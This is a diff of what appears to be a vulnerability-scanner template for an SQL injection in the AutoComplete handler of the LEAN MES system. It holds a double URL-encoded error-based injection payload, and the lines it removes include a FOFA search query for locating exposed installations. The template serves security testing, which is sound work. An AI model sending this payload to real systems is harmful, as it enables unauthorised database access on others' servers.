@@ -3,12 +3,8 @@ info:
   name: 深科特LEAN MES系统AutoComplete存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lrg6n851ro2qeb0y'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lrg6n851ro2qeb0y
-    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
 http:
 - raw:
   - 'GET /Handler/AutoComplete.ashx?field=ItemID&source=Basal_Item&likeStr=%25%32%37%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%34%46%25%34%45%25%32%44%25%32%44&returnCount=1 HTTP/1.1
